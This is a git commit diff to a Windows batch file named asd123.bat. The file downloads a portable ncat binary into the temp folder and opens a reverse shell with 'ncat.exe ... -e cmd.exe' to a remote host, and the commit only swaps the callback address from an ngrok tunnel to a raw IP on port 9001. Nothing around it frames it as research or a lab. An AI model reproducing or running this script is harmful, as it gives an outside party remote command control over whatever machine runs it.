3cfe30dee08103668470ca820362c153c05d4c5b
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-03-08 19:48:00 +0300

    Update asd123.bat

--- asd123.bat
+++ asd123.bat
@@ -1,3 +1,3 @@
 cd %temp%
 curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe 
-ncat.exe 1.tcp.in.ngrok.io 20148 -e cmd.exe
+ncat.exe 185.194.175.132 9001 -e cmd.exe
